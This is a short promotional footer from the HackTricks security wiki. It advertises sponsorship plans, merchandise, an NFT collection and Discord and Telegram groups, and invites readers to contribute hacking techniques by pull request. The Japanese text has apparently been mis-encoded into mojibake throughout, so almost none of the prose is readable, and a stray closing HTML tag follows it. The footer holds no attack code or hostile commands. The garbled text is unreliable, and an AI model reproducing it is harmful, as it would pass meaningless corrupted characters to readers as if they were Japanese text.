* ã‚‚ã—ã‚‚ã‚ãªãŸã®**ä¼šç¤¾ã‚’HackTricksã§å®£ä¼ã—ãŸã„**å ´åˆã‚„ã€**æœ€æ–°ç‰ˆã®PEASSã‚„HackTricksã®PDFã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼ã®PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚
* **HackTricks**ã¨**HackTricks Cloud**ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã—ã¾ã—ã‚‡ã†ã€‚

</details>
